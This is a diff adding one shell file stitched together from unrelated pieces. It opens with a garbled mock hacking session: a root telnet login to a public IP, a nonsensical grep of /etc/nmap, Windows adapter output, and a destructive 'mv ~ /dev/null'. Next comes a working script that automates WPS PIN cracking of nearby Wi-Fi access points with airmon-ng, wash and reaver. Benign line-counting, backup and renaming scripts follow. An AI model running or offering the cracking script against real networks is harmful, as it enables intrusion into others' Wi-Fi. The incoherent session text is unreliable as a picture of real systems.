@@ -1,0 +1,307 @@
+anon@wks05:-$ grep root /etc/nmap
+eoot:x:0:0:root:/root:/bin/bash
+
+nmap -sT -A localhost
+
+Starting nmap V. 3.00
+Interesting ports on localhost.localdomain (127.0.0.1):
+(The 1596 ports scanned but not shown below are in state: closed)
+
+Port       State       Service
+22/tcp     open        ssh
+111/tcp    open        sunrpc
+515/tcp    open        printer
+834/tcp    open        unknown
+6000/tcp   open        X11
+Remote OS guesses: Linux Kernel 2.4.0 or Gentoo 1.2 Linux 2.4.19 rc1-rc7)
+
+Nmap run completed -- 1 IP address (1 host up) scanned in 5 seconds
+
+cat /etc/services | grep 834
+tcp   0    0 0.0.0.0:834    0.0.0.0:*   LISTEN   653/ypbind
+lsof -i | grep 834
+
+ypbind      653        0    7u  IPv4       1319                 TCP *:834 (LISTEN)
+ypbind      655        0    7u  IPv4       1319                 TCP *:834 (LISTEN)
+ypbind      656        0    7u  IPv4       1319                 TCP *:834 (LISTEN)
+ypbind      657        0    7u  IPv4       1319                 TCP *:834 (LISTEN)
+
+Discovered open port 80/top on 207.46.250.119
+
+nixcraft@wks05:-$ telnet -l root 207.46.250.119
+Trying 207.46.250.119
+Connected to localhost
+
+login: root
+password: ***********
+
+Last login: Tue Aug 10 16:51:20 from 4chan
+Welcome to localhost!
+
+Tunnel adapter Local Area Connection* 9:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . :
+   Description . . . . . . . . . . . : Microsoft Teredo Tunneling Adapter
+   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+
+
+
+[root@localhost]# mv ~ /dev/null
+
+
+wireless_interface=wlan0
+ 
+#The timeout (in seconds) for wash to search for WPS-enabled access points
+wash_timeout=15
+ 
+#Flag to allow user to choose target AP
+allow_user_choice=1
+ 
+#Delay between attack attempts
+reaver_delay=0
+ 
+#Check for root privileges
+if (( EUID != 0 )); then
+  echo "This script needs root"
+  exit 1
+fi
+ 
+#Check for required commands
+for command in airmon-ng wash reaver
+do
+  if [[ -z $(which $command) ]]; then
+     echo "$command was not found"
+     echo "To install $command, you may follow this link"
+     echo "http://lmgtfy.com/?q=$command+installation"
+     exit 1
+  fi
+done
+ 
+echo "WARNING: Network connections are about to go down. You may need to re-enable wireless connections manually"
+ 
+#Check available interfaces and close previous monitor interfaces and wireless lan
+for interface in $(ifconfig | tr -s [:space:] | cut -f1 -d" " | tr -s [:space:])
+do
+  if [[ -n $(echo $interface | grep "^mon*") ]] || [[ -n $(echo $interface | grep '0$') ]] && [[ $(echo $interface) != "eth0" ]]; then
+    echo "* Shutting down $interface"
+    airmon-ng stop $interface > /dev/null
+  fi
+done
+ 
+echo "* Starting a new monitor interface mon0"
+airmon-ng start $wireless_interface > /dev/null
+ 
+echo "Identifying WPS-enabled access points"
+timeout $wash_timeout wash -i mon0 --ignore-fcs > washOutput.txt
+APs=$(cat washOutput.txt | tail -n +3 | tr -s ' ' | cut -f6 -d' ')
+ 
+if [[ -n $(echo $APs) ]]; then
+   if  (( $allow_user_choice )); then
+      n=1
+      echo "The following access points were detected"
+      for ap in $APs
+      do
+        echo "* $n: $ap"
+        ((n++))
+      done
+      read -p "Enter your choice: " choice
+      if [[ $choice -le $n ]]; then
+        chosen_ap=$(echo "${APs}" | head -$choice | tail -1)
+    echo "You have chosen $chosen_ap"
+      else
+    echo "Invalid choice!"
+    exit 1
+      fi
+   else
+      chosen_ap=$(echo "${APs}" | head -n1)
+      echo "Proceeding with choice 1: $chosen_ap"
+   fi
+   tempLine=$(cat washOutput.txt | grep $chosen_ap | tr -s ' ')
+   rm washOutput.txt
+   channel=$(echo $tempLine | cut -f2 -d' ')
+   mac_address=$(echo $tempLine | cut -f1 -d' ')
+   echo "Starting reaver"
+   echo "reaver -a -S -vv -c $channel -i mon0 -b $mac_address -d $reaver_delay"
+   echo "AP name: $chosen_ap"
+   echo "Channel: $channel"
+   echo "MAC Address: $mac_address"
+   reaver -a -S -vv -c $channel -i mon0 -b $mac_address -d $reaver_delay
+else
+   echo "No networks found. Consider increasing the wash timeout. Terminating"
+   exit 1
+fi
+
+
+help=0
+verb=0
+weeks=0
+# defaults
+days=0
+m=1
+str="days"
+getopts "hvd:w:" name
+while [ "$name" != "?" ] ; do
+  case $name in
+   h) help=1;;   
+   v) verb=1;;   
+   d) days=$OPTARG
+      m=$OPTARG
+      str="days";;
+   w) weeks=$OPTARG
+      m=$OPTARG
+      str="weeks";;
+  esac 
+  getopts "hvd:w:" name
+done
+
+if [ $help -eq 1 ]
+ then no_of_lines=`cat $0 | awk 'BEGIN { n = 0; } \
+                                 /^$/ { print n; \
+                                        exit; } \
+                                      { n++; }'`
+      echo "`head -$no_of_lines $0`"
+      exit 
+fi
+
+shift $[ $OPTIND - 1 ]
+
+if [ $# -lt 1 ]
+then
+  echo "Usage: $0 file ..."
+  exit 1
+fi
+
+if [ $verb -eq 1 ]
+  then echo "$0 counts the lines of code" 
+fi
+
+l=0
+n=0
+s=0
+for f in $*
+do
+  x=`stat -c "%y" $f`
+  # modification date
+  d=`date --date="$x" +%y%m%d`
+  # date of $m days/weeks ago
+  e=`date --date="$m $str ago" +%y%m%d`
+  # now
+  z=`date +%y%m%d`
+  #echo "Stat: $x; Now: $z; File: $d; $m $str ago: $e"
+  # checks whether file is more recent then req
+  if [ $d -ge $e -a $d -le $z ] # ToDo: fix year wrap-arounds
+  then 
+      # be verbose if we found a recent file
+      if [ $verb -eq 1 ] 
+        then echo "$f: modified (mmdd) $d"
+      fi
+      # do the line count
+      l=`wc -l $f | sed 's/^\([0-9]*\).*$/\1/'`
+      echo "$f: $l"
+      # increase the counters
+      n=$[ $n + 1 ]
+      s=$[ $s + $l ]
+  else
+      # not strictly necessary, because it's the end of the loop
+      continue
+  fi
+done
+
+echo "$n files in total, with $s lines in total"
+
+
+
+  #!/bin/bash          
+            SRCD="/home/"
+            TGTD="/var/backups/"
+            OF=home-$(date +%Y%m%d).tgz
+            tar -cZf $TGTD$OF $SRCD
+
+
+
+             if [ $1 = p ]; then
+             
+               prefix=$2 ; shift ; shift
+             
+      
+             
+               if [$1 = ]; then
+                  echo "no files given"
+                  exit 0
+               fi
+             
+
+               for file in $*
+                 do
+                 mv ${file} $prefix$file
+               done
+             
+
+               exit 0
+             fi
+             
+
+             if [ $1 = s ]; then
+               suffix=$2 ; shift ; shift
+             
+                if [$1 = ]; then
+                 echo "no files given"
+                exit 0
+                fi
+             
+              for file in $*
+               do
+                mv ${file} $file$suffix
+              done
+             
+              exit 0
+             fi
+             
+             # check for the replacement rename
+             if [ $1 = r ]; then
+             
+               shift
+             
+
+             
+               if [ $# -lt 3 ] ; then
+                 echo "usage: renna r [expression] [replacement] files... "
+                 exit 0
+               fi
+
+               OLD=$1 ; NEW=$2 ; shift ; shift
+             
+
+             
+               for file in $*
+               do
+                 new=`echo ${file} | sed s/${OLD}/${NEW}/g`
+                 mv ${file} $new
+               done
+             exit 0
+             fi
+             
+
+             echo "usage;"
+             echo " renna p [prefix] files.."
+             echo " renna s [suffix] files.."
+             echo " renna r [expression] [replacement] files.."
+             exit 0
+             
+  #!/bin/bash
+     # renames.sh
+     # basic file renamer
+
+     criteria=$1
+     re_match=$2
+     replace=$3
+     
+     for i in $( ls *$criteria* ); 
+     do
+         src=$i
+         tgt=$(echo $i | sed -e "s/$re_match/$replace/")
+         mv $src $tgt
+     done
